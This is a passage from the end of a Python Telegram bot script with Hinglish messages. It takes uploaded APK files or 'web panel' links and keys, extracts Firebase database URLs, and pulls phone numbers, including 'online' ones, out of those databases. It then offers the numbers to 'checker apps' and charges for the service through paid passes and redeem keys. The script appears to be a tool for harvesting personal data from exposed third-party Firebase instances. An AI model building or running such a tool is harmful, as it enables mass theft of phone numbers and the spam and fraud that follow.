                                    found_urls = extract_firebase_from_apk(tmp_name)
                                    try:
                                        os.remove(tmp_name)
                                    except:
                                        pass
                                    
                                    if found_urls:
                                        fu = found_urls[0]
                                        status, all_nums, online_nums = check_firebase_and_extract_numbers(fu, "dummy")
                                        
                                        u_data = get_user_data(chat_id)
                                        u_data["pending_firebase"] = {"online": online_nums, "all": all_nums}
                                        update_user_data(chat_id, u_data)
                                        
                                        services = get_services_list()
                                        app_keyboard = []
                                        row = []
                                        for s in services:
                                            row.append({"text": s.capitalize(), "callback_data": f"chk_app_{s}"})
                                            if len(row) == 2:
                                                app_keyboard.append(row)
                                                row = []
                                        if row:
                                            app_keyboard.append(row)
                                        
                                        menu_text = (
                                            f"🔥 **APK Firebase Extracted Successfully!**\n\n"
                                            f"🔗 URL: `{fu}`\n"
                                            f"📱 Total Numbers Found: `{len(all_nums)}` (Online: `{len(online_nums)}`)\n\n"
                                            f"👇 **Select Checker App:**"
                                        )
                                        send_keyboard_message(session, token, chat_id, menu_text, app_keyboard)
                                    else:
                                        session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ Is APK ke andar koi valid Firebase URL nahi mila."})
                            else:
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "⚠️ Kripya sirf `.apk` file hi bhejiye."})

                        elif text:
                            if chat_id in waiting_for_panel and waiting_for_panel[chat_id]:
                                waiting_for_panel[chat_id] = False
                            
                            parsed_links = parse_links_bulk(text)
                            if parsed_links:
                                if not is_admin and not user_has_sub:
                                    session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ **Access Denied!**\n\nWeb panel scan karne ke liye aapke paas **Active Unlimited Pass** hona zaroori hai.\n\n💡 Pass lene ke liye `/profile` se credits use karein ya `/redeem <key>` karein!"})
                                    continue

                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": f"🔍 Total {len(parsed_links)} panel(s) parse ho gaye hain, numbers extract ho rahe hain..."})
                                
                                url, key, panel = parsed_links[0]
                                status, all_nums, online_nums = check_firebase_and_extract_numbers(url, key)
                                
                                u_data = get_user_data(chat_id)
                                u_data["pending_firebase"] = {"online": online_nums, "all": all_nums}
                                update_user_data(chat_id, u_data)
                                
                                services = get_services_list()
                                app_keyboard = []
                                row = []
                                for s in services:
                                    row.append({"text": s.capitalize(), "callback_data": f"chk_app_{s}"})
                                    if len(row) == 2:
                                        app_keyboard.append(row)
                                        row = []
                                if row:
                                    app_keyboard.append(row)
                                
                                menu_text = (
                                    f"🔥 **Web Panel Firebase Extracted Successfully!**\n\n"
                                    f"🏢 Panel: `{panel}`\n"
                                    f"📱 Total Numbers Found: `{len(all_nums)}` (Online: `{len(online_nums)}`)\n\n"
                                    f"👇 **Select Checker App:**"
                                )
                                send_keyboard_message(session, token, chat_id, menu_text, app_keyboard)
                            else:
                                session.post(f"https://api.telegram.org/bot{token}/sendMessage", json={"chat_id": chat_id, "text": "❌ Invalid link or format."})
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
        time.sleep(1)

if __name__ == "__main__":
    print("="*50)
    print("  Bot Running with Manual Number Checker & Fixed Extractor...")
    print("="*50)
    session = requests.Session()
    threading.Thread(target=telegram_listener, args=(BOT_TOKEN, session), daemon=True).start()
    run_flask()
